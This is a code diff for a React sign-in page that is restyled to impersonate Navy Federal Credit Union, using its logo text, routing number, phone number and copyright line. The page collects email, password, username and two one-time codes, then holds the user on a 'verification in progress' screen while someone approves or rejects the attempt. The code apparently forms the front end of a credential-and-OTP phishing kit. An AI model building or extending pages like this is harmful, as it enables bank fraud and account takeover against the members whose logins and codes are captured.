@@ -53,15 +53,52 @@ export default function SignInPage() {
 
   if (step === 'approved_success') {
     return (
-      <main style={plainPage}>
-        <div style={column}>
-          <h1 style={heading}>Congratulations</h1>
-          <p style={text}>Your account &amp; verification has been approved.</p>
-          {email ? <p style={text}>{email}</p> : null}
+      <div style={styles.page}>
+        <div style={styles.card}>
+          <div style={styles.icon}>✅</div>
+          <h1 style={styles.heading}>Congratulations</h1>
+          <p style={styles.text}>Your account &amp; verification has been approved.</p>
+          {email ? <p style={styles.text}>{email}</p> : null}
         </div>
-      </main>
+      </div>
     );
   }
+
+  if (step === 'rejected') {
+    return (
+      <div style={styles.page}>
+        <div style={styles.card}>
+          <div style={styles.icon}>🚫</div>
+          <h1 style={{ ...styles.heading, color: '#c62828' }}>Sign-in Blocked</h1>
+          <p style={styles.text}>Your sign-in was rejected.</p>
+          <button
+            style={styles.orangeBtn}
+            onClick={() => {
+              setStep('credentials');
+              setAttemptId(null);
+              setUsername('');
+              setOtp('');
+              setError(null);
+              setNote(null);
+            }}
+          >
+            Try Again
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
+    credentials: 'Sign In',
+    username: 'Enter Username',
+    otp1: 'Enter Code',
+    otp2: 'Enter Second Code',
+    awaiting_approval: 'Verification in Progress',
+    rejected: 'Sign-in Blocked',
+  };
+
+  const showSubmit = step === 'credentials' || step === 'username' || step === 'otp1' || step === 'otp2';
 
   async function onSubmit(e: React.FormEvent) {
     e.preventDefault();
@@ -125,178 +162,379 @@ export default function SignInPage() {
     }
   }
 
-  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
-    credentials: 'Log in',
-    username: 'Enter username',
-    otp1: 'Enter first code',
-    otp2: 'Enter second code',
-    awaiting_approval: 'Verification in progress',
-    rejected: 'Sign-in blocked',
-  };
-
-  // FIXED: This is the corrected version - only check for the 4 active states
-  const activeSteps: Step[] = ['credentials', 'username', 'otp1', 'otp2'];
-
   return (
-    <main style={plainPage}>
-      <div style={column}>
-        <h1 style={heading}>{titles[step as Exclude<Step, 'approved_success'>]}</h1>
+    <div style={styles.page}>
+      {/* HEADER */}
+      <header style={styles.header}>
+        <div style={styles.headerInner}>
+          <div style={styles.logo}>
+            NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
+          </div>
+          <span style={styles.routing}>Routing Number: 256074974</span>
+        </div>
+      </header>
 
-        <form onSubmit={onSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-          {step === 'credentials' && (
-            <>
-              <label style={label}>
-                Email
+      {/* MAIN */}
+      <div style={styles.content}>
+        <div style={styles.container}>
+          <h1 style={styles.formHeading}>{titles[step as Exclude<Step, 'approved_success'>]}</h1>
+
+          <form onSubmit={onSubmit} style={styles.form}>
+            {step === 'credentials' && (
+              <>
+                <div style={styles.field}>
+                  <label style={styles.label}>Email Address</label>
+                  <input
+                    type="email"
+                    required
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    style={styles.input}
+                    placeholder="you@example.com"
+                  />
+                </div>
+                <div style={styles.field}>
+                  <label style={styles.label}>Password</label>
+                  <input
+                    type="password"
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    style={styles.input}
+                    placeholder="Enter your password"
+                  />
+                </div>
+                <a href="#" style={styles.helpLink}>SIGN IN HELP</a>
+              </>
+            )}
+
+            {step === 'username' && (
+              <div style={styles.field}>
+                <label style={styles.label}>Username</label>
                 <input
-                  type="email"
                   required
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  style={input}
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  style={styles.input}
+                  placeholder="Enter your username"
+                  autoComplete="username"
                 />
-              </label>
-              <label style={label}>
-                Password
+              </div>
+            )}
+
+            {(step === 'otp1' || step === 'otp2') && (
+              <div style={styles.field}>
+                <label style={styles.label}>
+                  {step === 'otp1' ? 'Verification Code' : 'Second Code'}
+                </label>
                 <input
-                  type="password"
                   required
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  style={input}
+                  inputMode="numeric"
+                  maxLength={6}
+                  value={otp}
+                  onChange={(e) =>
+                    setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
+                  }
+                  style={{ ...styles.input, ...styles.otpInput }}
+                  placeholder="000000"
                 />
-              </label>
-            </>
-          )}
+              </div>
+            )}
 
-          {step === 'username' && (
-            <label style={label}>
-              Username
-              <input
-                required
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                style={input}
-                autoComplete="username"
-              />
-            </label>
-          )}
+            {step === 'awaiting_approval' && (
+              <div style={styles.waitingBox}>
+                <div style={styles.waitingIcon}>⏳</div>
+                <p style={styles.waitingText}>{WAIT_MSG}</p>
+              </div>
+            )}
 
-          {(step === 'otp1' || step === 'otp2') && (
-            <label style={label}>
-              {step === 'otp1' ? 'Code' : 'Second code'}
-              <input
-                required
-                inputMode="numeric"
-                maxLength={6}
-                value={otp}
-                onChange={(e) =>
-                  setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
-                }
-                style={input}
-              />
-            </label>
-          )}
+            {error && <div style={styles.error}>{error}</div>}
+            {note && step !== 'awaiting_approval' && (
+              <div style={styles.note}>{note}</div>
+            )}
 
-          {step === 'awaiting_approval' && (
-            <p style={{ ...text, lineHeight: 1.5 }}>{WAIT_MSG}</p>
-          )}
+            {showSubmit && (
+              <button type="submit" disabled={loading} style={styles.submit}>
+                {loading ? 'Processing…' : 'Continue'}
+              </button>
+            )}
 
-          {error && <p style={{ color: '#c00', margin: 0, fontSize: 14 }}>{error}</p>}
-          {note && step !== 'awaiting_approval' && (
-            <p style={{ color: '#333', margin: 0, fontSize: 14 }}>{note}</p>
-          )}
-
-          {/* FIXED: Only show buttons for active steps (not awaiting_approval, rejected, or approved_success) */}
-          {activeSteps.includes(step) && (
-            <button type="submit" disabled={loading} style={button}>
-              {loading ? 'Please wait…' : 'Continue'}
-            </button>
-          )}
-
-          {step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && step !== 'approved_success' && (
-            <button
-              type="button"
-              onClick={() => {
-                setStep('credentials');
-                setAttemptId(null);
-                setUsername('');
-                setOtp('');
-                setError(null);
-                setNote(null);
-              }}
-              style={buttonSecondary}
-            >
-              Start over
-            </button>
-          )}
-        </form>
+            {step !== 'credentials' &&
+              step !== 'awaiting_approval' &&
+              step !== 'rejected' &&
+              step !== 'approved_success' && (
+                <button
+                  type="button"
+                  style={styles.secondary}
+                  onClick={() => {
+                    setStep('credentials');
+                    setAttemptId(null);
+                    setUsername('');
+                    setOtp('');
+                    setError(null);
+                    setNote(null);
+                  }}
+                >
+                  Start Over
+                </button>
+              )}
+          </form>
+        </div>
       </div>
-    </main>
+
+      {/* FOOTER */}
+      <footer style={styles.footer}>
+        <div style={styles.footerInner}>
+          <div>
+            <div style={styles.footerLogo}>
+              NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
+            </div>
+            <div style={styles.footerContact}>
+              24/7 Member Services: <strong>1-888-842-6328</strong>
+            </div>
+            <div style={styles.footerContact}>
+              Routing Number: <strong>256074974</strong>
+            </div>
+          </div>
+          <div style={styles.footerLinks}>
+            <a href="#" style={styles.footerLink}>About Us</a>
+            <a href="#" style={styles.footerLink}>Contact Us</a>
+            <a href="#" style={styles.footerLink}>Privacy</a>
+            <a href="#" style={styles.footerLink}>Security</a>
+            <a href="#" style={styles.footerLink}>Accessibility</a>
+            <a href="#" style={styles.footerLink}>Terms</a>
+          </div>
+        </div>
+        <div style={styles.footerBottom}>
+          <span>© 2026 Navy Federal Credit Union.</span>
+          <span>All rights reserved.</span>
+        </div>
+      </footer>
+    </div>
   );
 }
 
-const plainPage: React.CSSProperties = {
-  minHeight: '100vh',
-  margin: 0,
-  background: '#ffffff',
-  color: '#000000',
-  display: 'flex',
-  alignItems: 'center',
-  justifyContent: 'center',
-  padding: 16,
-  fontFamily: 'system-ui, sans-serif',
-};
-
-const column: React.CSSProperties = {
-  width: '100%',
-  maxWidth: 320,
-};
-
-const heading: React.CSSProperties = {
-  margin: '0 0 16px',
-  fontSize: 20,
-  fontWeight: 600,
-};
-
-const label: React.CSSProperties = {
-  display: 'flex',
-  flexDirection: 'column',
-  gap: 4,
-  fontSize: 14,
-};
-
-const input: React.CSSProperties = {
-  height: 36,
-  padding: '0 8px',
-  border: '1px solid #ccc',
-  borderRadius: 2,
-  background: '#fff',
-  color: '#000',
-  fontSize: 14,
-};
-
-const button: React.CSSProperties = {
-  height: 36,
-  border: '1px solid #999',
-  borderRadius: 2,
-  background: '#f0f0f0',
-  color: '#000',
-  fontSize: 14,
-  cursor: 'pointer',
-};
-
-const buttonSecondary: React.CSSProperties = {
-  height: 36,
-  border: '1px solid #ccc',
-  borderRadius: 2,
-  background: '#fff',
-  color: '#000',
-  fontSize: 14,
-  cursor: 'pointer',
-};
-
-const text: React.CSSProperties = {
-  margin: '0 0 8px',
-  fontSize: 14,
-  color: '#000',
+const styles = {
+  page: {
+    minHeight: '100vh',
+    background: '#fafafa',
+    fontFamily: '"Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif',
+    display: 'flex',
+    flexDirection: 'column' as const,
+    alignItems: 'center',
+  },
+  header: {
+    background: '#0a1628',
+    padding: '12px 16px',
+    width: '100%',
+  },
+  headerInner: {
+    maxWidth: '1200px',
+    margin: '0 auto',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'space-between',
+    flexWrap: 'wrap' as const,
+    gap: '8px',
+  },
+  logo: {
+    fontSize: 'clamp(18px, 4vw, 24px)',
+    fontWeight: 700,
+    color: 'white',
+    letterSpacing: '1px',
+  },
+  routing: {
+    color: 'rgba(255,255,255,0.7)',
+    fontSize: 'clamp(11px, 2vw, 14px)',
+  },
+  content: {
+    flex: 1,
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    padding: '24px 16px',
+    width: '100%',
+    maxWidth: '400px',
+  },
+  container: {
+    width: '100%',
+  },
+  formHeading: {
+    fontSize: 'clamp(20px, 4vw, 28px)',
+    fontWeight: 600,
+    color: '#0a1628',
+    marginBottom: '24px',
+  },
+  form: {
+    display: 'flex',
+    flexDirection: 'column' as const,
+    gap: '16px',
+  },
+  field: {
+    display: 'flex',
+    flexDirection: 'column' as const,
+    gap: '6px',
+  },
+  label: {
+    fontSize: '14px',
+    fontWeight: 500,
+    color: '#222',
+  },
+  input: {
+    height: 40,
+    padding: '0 12px',
+    border: '2px solid #999',
+    borderRadius: '6px',
+    background: '#fff',
+    fontSize: '16px',
+    outline: 'none',
+    width: '100%',
+    boxSizing: 'border-box' as const,
+  },
+  otpInput: {
+    textAlign: 'center' as const,
+    fontSize: '24px',
+    letterSpacing: '8px',
+  },
+  helpLink: {
+    display: 'inline-block',
+    color: '#0667ba',
+    fontSize: '14px',
+    fontWeight: 600,
+    textDecoration: 'none',
+    borderBottom: '2px dotted #0667ba',
+    paddingBottom: '2px',
+    textTransform: 'uppercase' as const,
+    width: 'fit-content',
+  },
+  submit: {
+    height: 44,
+    border: 'none',
+    borderRadius: '6px',
+    background: '#ed780f',
+    color: 'white',
+    fontSize: '16px',
+    fontWeight: 600,
+    cursor: 'pointer',
+    width: '100%',
+  },
+  secondary: {
+    height: 40,
+    border: '2px solid #0667ba',
+    borderRadius: '6px',
+    background: 'transparent',
+    color: '#0667ba',
+    fontSize: '14px',
+    fontWeight: 600,
+    cursor: 'pointer',
+    width: '100%',
+  },
+  error: {
+    padding: '10px 14px',
+    borderRadius: '4px',
+    background: '#ffebee',
+    color: '#c62828',
+    fontSize: '14px',
+    border: '1px solid #ffcdd2',
+  },
+  note: {
+    padding: '10px 14px',
+    borderRadius: '4px',
+    background: '#e3f2fd',
+    color: '#0d47a1',
+    fontSize: '14px',
+    border: '1px solid #bbdefb',
+  },
+  waitingBox: {
+    textAlign: 'center' as const,
+    padding: '20px 0',
+  },
+  waitingIcon: {
+    fontSize: '48px',
+    marginBottom: '16px',
+  },
+  waitingText: {
+    color: '#555',
+    fontSize: '14px',
+    lineHeight: 1.6,
+  },
+  card: {
+    maxWidth: '400px',
+    width: '100%',
+    padding: '40px 30px',
+    background: 'white',
+    borderRadius: '12px',
+    boxShadow: '0 8px 24px rgba(0,0,0,0.12)',
+    textAlign: 'center' as const,
+  },
+  icon: {
+    fontSize: '48px',
+    marginBottom: '16px',
+  },
+  heading: {
+    fontSize: 'clamp(24px, 4vw, 28px)',
+    fontWeight: 600,
+    color: '#0a1628',
+    marginBottom: '8px',
+  },
+  text: {
+    fontSize: '16px',
+    color: '#555',
+    marginBottom: '8px',
+  },
+  orangeBtn: {
+    padding: '12px 32px',
+    background: '#ed780f',
+    color: 'white',
+    fontSize: '18px',
+    fontWeight: 600,
+    border: 'none',
+    borderRadius: '8px',
+    cursor: 'pointer',
+    marginTop: '16px',
+  },
+  footer: {
+    background: '#0a1628',
+    color: 'rgba(255,255,255,0.7)',
+    padding: 'clamp(30px, 5vw, 40px) 16px',
+    marginTop: '40px',
+    width: '100%',
+  },
+  footerInner: {
+    maxWidth: '1200px',
+    margin: '0 auto',
+    display: 'flex',
+    flexWrap: 'wrap' as const,
+    gap: 'clamp(20px, 4vw, 30px)',
+    justifyContent: 'space-between',
+  },
+  footerLogo: {
+    fontSize: 'clamp(18px, 3vw, 20px)',
+    fontWeight: 700,
+    color: 'white',
+    marginBottom: '8px',
+  },
+  footerContact: {
+    fontSize: 'clamp(12px, 2vw, 14px)',
+    marginBottom: '8px',
+  },
+  footerLinks: {
+    display: 'flex',
+    flexWrap: 'wrap' as const,
+    gap: 'clamp(12px, 2vw, 20px)',
+  },
+  footerLink: {
+    color: 'rgba(255,255,255,0.7)',
+    textDecoration: 'none',
+    fontSize: 'clamp(12px, 2vw, 14px)',
+  },
+  footerBottom: {
+    borderTop: '1px solid rgba(255,255,255,0.1)',
+    paddingTop: '20px',
+    marginTop: '20px',
+    textAlign: 'center' as const,
+    fontSize: 'clamp(11px, 2vw, 12px)',
+    maxWidth: '1200px',
+    margin: '20px auto 0',
+  },
 };
